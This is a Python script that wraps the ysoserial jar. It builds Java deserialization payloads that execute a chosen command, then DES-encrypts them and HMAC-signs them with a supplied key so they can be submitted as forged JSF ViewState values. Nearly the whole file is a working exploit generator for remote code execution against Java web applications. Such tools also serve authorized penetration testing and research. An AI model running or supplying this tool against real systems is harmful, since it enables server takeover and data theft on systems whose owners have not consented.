#!/usr/bin/python3
"""Provide a wrapper to the ysoserial jar in order to increase it's functionalities by adding encryption to the payloads"""

from sys import version_info

if version_info < (3, 6):
    raise ImportError("Python 3.6 or greater is required")
        
from argparse import ArgumentParser
from base64 import b64decode, b64encode
from hashlib import sha1
from hmac import digest
from os import environ
from os.path import isfile
from shlex import split
from subprocess import check_output
from urllib.parse import quote

from pyDes import des, ECB, CBC, PAD_PKCS5

from .errors import *


def get_payload(payload_type: str, command: str) -> bytes:
    """Generate a ysoserial viewstate payload
    
    Args:
        type (str): type of the generated payload.
        command (str): command that the viewstate will execute
    Returns:
        viewstate payload generated by ysoserial
    Raises:
        JarNotFoundException: if the ysoserial jar doesn't exist
    """
    if not isfile("ysoserial.jar"):
        raise JarNotFoundException("Unable to open file. Either the file doesn't exist or you have no read permissions.")
    return check_output(split(f"java -jar ysoserial.jar {payload_type} '{command}'"))


def encrypt(viewstate: bytes) -> str:
    """Encrypt a viewstate payload

    Args:
        viewstate (bytes): viewstate payload generated by ysoserial
    Returns:
        DES encrypted base64 viewstate
    Raises:
        EnvironmentKeyNotFoundException: if the KEY environment variable is not set
    """
    if not 'KEY' in environ:
        raise EnvironmentKeyNotFoundException("Please set the KEY environment variable with your encryption key.")
    key = environ['KEY'].encode()
    encrypted_viewstate = des(key).encrypt(viewstate, ECB, PAD_PKCS5)
    hmac_sha1 = digest(key, encrypted_viewstate, sha1)
    return quote(b64encode(encrypted_viewstate + hmac_sha1).decode())


def main():
    parser = ArgumentParser(description='Create ysoserial payload and encrypt it using a key')
    parser.add_argument('-t', '--type', nargs='?', const='CommonsCollection6', type=str, default='CommonsCollection6', help="type of the payload generated by ysoserial")
    parser.add_argument('-c', '--command', type=str, required=True, help="payload to be generated by ysoserial")
    args = parser.parse_args()
    try:
        print(f'Your encrypted payload:\n\n{encrypt(get_payload(args.type, args.command))}')
    except Exception as e:
        print(e)


if __name__ == "__main__":
    main()
